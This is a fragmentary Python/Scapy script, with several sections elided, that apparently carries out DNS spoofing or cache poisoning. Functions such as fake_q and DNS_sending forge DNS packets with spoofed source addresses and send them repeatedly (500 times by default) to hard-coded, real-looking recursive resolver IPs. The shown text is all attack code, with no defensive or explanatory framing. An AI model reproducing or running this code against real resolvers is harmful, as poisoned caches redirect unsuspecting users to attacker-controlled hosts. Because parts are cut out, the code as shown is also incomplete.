...
def Get_target_IP_list(target_server="180.76.76.76", domain="."):
    ans = sr1(
        IP(dst=target_server, src="172.17.0.3")
        / UDP(sport=RandShort(), dport=53)
        / DNS(rd=1, qd=DNSQR(qname=domain, qtype="NS"))
    )
    # print(ans.show2())
    IP_list = []
...
def fake_q(target_recursive_dns_ip, domain):
    ...
    req = (
        IP(dst=target_recursive_dns_ip)
...
def DNS_QR(target_server="202.117.0.20", qd="www.baidu.com"):
    ans = sr1(
        IP(dst=target_server)
        / UDP(sport=random.randint(1000, 10000), dport=53)
        / DNS(rd=1, qd=DNSQR(qname=qd, qtype="A")),
        timeout=5,
    )
    try:
        if ans:
...
def DNS_sending(
    target_server="202.117.0.20", domain="www.sahua1.club", iplist=[], times=500
):
    if len(iplist) == 0:
        print("no ip!!!")
        return
    ...
    fake_p = (
        IP(dst=target_server, src=iplist)
